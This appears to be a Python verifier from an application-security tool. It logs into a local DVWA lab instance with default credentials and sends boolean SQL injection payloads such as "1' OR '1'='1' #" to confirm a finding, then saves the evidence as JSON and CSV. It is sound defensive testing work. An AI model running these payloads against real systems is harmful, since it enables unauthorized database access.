import csv
import json
import re
from datetime import datetime, timezone
from pathlib import Path

import requests


BASE_URL = "http://localhost:4280"

USERNAME = "admin"
PASSWORD = "password"

USER_AGENT = "Evidence-Gated-AppSec/0.1"


def login_to_dvwa(session):
    """
    Log in to DVWA and keep the authenticated session.
    """

    login_url = f"{BASE_URL}/login.php"

    response = session.get(
        login_url,
        timeout=10
    )

    if response.status_code != 200:
        raise RuntimeError(
            f"Could not open DVWA login page. "
            f"HTTP {response.status_code}"
        )

    # DVWA uses a CSRF token called user_token.
    token_match = re.search(
        r"name=['\"]user_token['\"] value=['\"]([^'\"]+)['\"]",
        response.text
    )

    login_data = {
        "username": USERNAME,
        "password": PASSWORD,
        "Login": "Login"
    }

    if token_match:
        login_data["user_token"] = token_match.group(1)

    response = session.post(
        login_url,
        data=login_data,
        allow_redirects=True,
        timeout=10
    )

    if "Logout" not in response.text:
        raise RuntimeError(
            "DVWA login failed. "
            "Check username, password, and DVWA status."
        )

    # Keep DVWA in the deliberately vulnerable LOW-security mode.
    session.cookies.set("security", "low")

    print("DVWA login successful.")


def detect_database_error(response_text):
    """
    Look for common database-error indicators in the response.
    """

    text = response_text.lower()

    error_indicators = [
        "sql syntax",
        "mysql",
        "mariadb",
        "mysqli",
        "you have an error in your sql syntax"
    ]

    return any(
        indicator in text
        for indicator in error_indicators
    )


def count_dvwa_results(response_text):
    """
    Count SQLi result records returned by the DVWA page.

    DVWA displays 'First name:' once for each returned user record.
    """

    return response_text.count("First name:")


def run_test(
    session,
    target_url,
    parameter,
    payload,
    test_name
):
    """
    Execute one controlled HTTP request and return structured observations.
    """

    params = {
        parameter: payload,
        "Submit": "Submit"
    }

    response = session.get(
        target_url,
        params=params,
        headers={
            "User-Agent": USER_AGENT
        },
        timeout=10
    )

    result_count = count_dvwa_results(
        response.text
    )

    database_error_detected = detect_database_error(
        response.text
    )

    return {
        "test_name": test_name,
        "method": "GET",
        "url": response.url,
        "parameter": parameter,
        "payload": payload,
        "request_text": (
            f"GET {response.url}\n"
            f"User-Agent: {USER_AGENT}"
        ),
        "response": {
            "status_code": response.status_code,
            "response_length": len(response.content),
            "result_count": result_count,
            "database_error_detected": database_error_detected,
            "body_excerpt": response.text[:3000]
        }
    }


def collect_sql_injection_evidence(
    finding_id="F-0001",
    endpoint="/vulnerabilities/sqli/",
    parameter="id",
    method="GET"
):
    """
    Collect deterministic runtime evidence for a proposed SQL Injection finding.

    The verifier performs three requests:

    1. Baseline request
    2. TRUE-condition SQL test
    3. FALSE-condition SQL test

    Gemini is NOT involved in this verification step.
    """

    if method.upper() != "GET":
        raise NotImplementedError(
            "The current SQLi MVP verifier supports GET requests only."
        )

    session = requests.Session()

    login_to_dvwa(session)

    target_url = f"{BASE_URL}{endpoint}"

    print("\nCollecting SQL Injection runtime evidence...")

    # Normal behaviour.
    baseline_payload = "1"

    # This condition evaluates TRUE.
    true_payload = "1' OR '1'='1' #"

    # This condition evaluates FALSE.
    false_payload = "1' AND '1'='2' #"

    baseline_test = run_test(
        session=session,
        target_url=target_url,
        parameter=parameter,
        payload=baseline_payload,
        test_name="baseline"
    )

    print("Baseline request completed.")

    true_test = run_test(
        session=session,
        target_url=target_url,
        parameter=parameter,
        payload=true_payload,
        test_name="true_condition"
    )

    print("TRUE-condition request completed.")

    false_test = run_test(
        session=session,
        target_url=target_url,
        parameter=parameter,
        payload=false_payload,
        test_name="false_condition"
    )

    print("FALSE-condition request completed.")

    baseline_count = (
        baseline_test["response"]["result_count"]
    )

    true_count = (
        true_test["response"]["result_count"]
    )

    false_count = (
        false_test["response"]["result_count"]
    )

    all_requests_successful = all(
        test["response"]["status_code"] == 200
        for test in [
            baseline_test,
            true_test,
            false_test
        ]
    )

    behaviour_changed = (
        baseline_count != true_count
        or baseline_count != false_count
    )

    true_false_difference = (
        true_count != false_count
    )

    true_expands_results = (
        true_count > baseline_count
    )

    false_reduces_results = (
        false_count < baseline_count
    )

    database_error_detected = any(
        test["response"]["database_error_detected"]
        for test in [
            baseline_test,
            true_test,
            false_test
        ]
    )

    timestamp = datetime.now(timezone.utc)

    run_id = timestamp.strftime(
        "%Y%m%d_%H%M%S_%f"
    )

    evidence = {
        "finding_id": finding_id,
        "run_id": run_id,
        "timestamp_utc": timestamp.isoformat(),
        "target": BASE_URL,
        "endpoint": endpoint,
        "finding_type": "SQL_INJECTION",
        "parameter": parameter,
        "method": method.upper(),
        "verification_type": (
            "SQL_INJECTION_BOOLEAN_BEHAVIOUR_COMPARISON"
        ),
        "execution_status": "COMPLETED",
        "tests": {
            "baseline": baseline_test,
            "true_condition": true_test,
            "false_condition": false_test
        },
        "signals": {
            "all_requests_successful": all_requests_successful,
            "baseline_result_count": baseline_count,
            "true_result_count": true_count,
            "false_result_count": false_count,
            "behaviour_changed": behaviour_changed,
            "true_false_difference": true_false_difference,
            "true_expands_results": true_expands_results,
            "false_reduces_results": false_reduces_results,
            "database_error_detected": database_error_detected
        }
    }

    return evidence


def save_evidence(evidence):
    """
    Save:

    1. Detailed evidence as JSON.
    2. Human-readable summary as CSV.
    """

    artifacts_dir = Path("artifacts") / "runs"

    artifacts_dir.mkdir(
        parents=True,
        exist_ok=True
    )

    run_id = evidence["run_id"]

    # ----------------------------
    # Detailed JSON
    # ----------------------------

    json_file = (
        artifacts_dir
        / f"{run_id}_runtime_evidence.json"
    )

    with json_file.open(
        "w",
        encoding="utf-8"
    ) as file:
        json.dump(
            evidence,
            file,
            indent=2,
            ensure_ascii=False
        )

    # ----------------------------
    # Simple CSV summary
    # ----------------------------

    csv_file = (
        artifacts_dir
        / "runtime_evidence_summary.csv"
    )

    signals = evidence["signals"]

    summary_row = {
        "run_id": evidence["run_id"],
        "finding_id": evidence["finding_id"],
        "finding_type": evidence["finding_type"],
        "endpoint": evidence["endpoint"],
        "parameter": evidence["parameter"],
        "method": evidence["method"],
        "baseline_result": signals[
            "baseline_result_count"
        ],
        "true_result": signals[
            "true_result_count"
        ],
        "false_result": signals[
            "false_result_count"
        ],
        "behaviour_changed": signals[
            "behaviour_changed"
        ],
        "true_false_difference": signals[
            "true_false_difference"
        ],
        "database_error_detected": signals[
            "database_error_detected"
        ]
    }

    fieldnames = list(
        summary_row.keys()
    )

    file_exists = csv_file.exists()

    with csv_file.open(
        "a",
        newline="",
        encoding="utf-8"
    ) as file:

        writer = csv.DictWriter(
            file,
            fieldnames=fieldnames
        )

        if not file_exists:
            writer.writeheader()

        writer.writerow(summary_row)

    return json_file, csv_file


if __name__ == "__main__":

    evidence = collect_sql_injection_evidence()

    json_file, csv_file = save_evidence(
        evidence
    )

    signals = evidence["signals"]

    print("\nRUNTIME VERIFICATION RESULT")
    print("--------------------------------")

    print(
        f"Finding ID: "
        f"{evidence['finding_id']}"
    )

    print(
        f"Finding type: "
        f"{evidence['finding_type']}"
    )

    print(
        f"Endpoint: "
        f"{evidence['endpoint']}"
    )

    print(
        f"Parameter: "
        f"{evidence['parameter']}"
    )

    print(
        f"Baseline result: "
        f"{signals['baseline_result_count']}"
    )

    print(
        f"TRUE result: "
        f"{signals['true_result_count']}"
    )

    print(
        f"FALSE result: "
        f"{signals['false_result_count']}"
    )

    print(
        f"Behaviour changed: "
        f"{signals['behaviour_changed']}"
    )

    print(
        f"TRUE/FALSE difference: "
        f"{signals['true_false_difference']}"
    )

    print(
        f"Database error detected: "
        f"{signals['database_error_detected']}"
    )

    print(
        f"\nDetailed JSON saved to: "
        f"{json_file}"
    )

    print(
        f"CSV summary saved to: "
        f"{csv_file}"
    )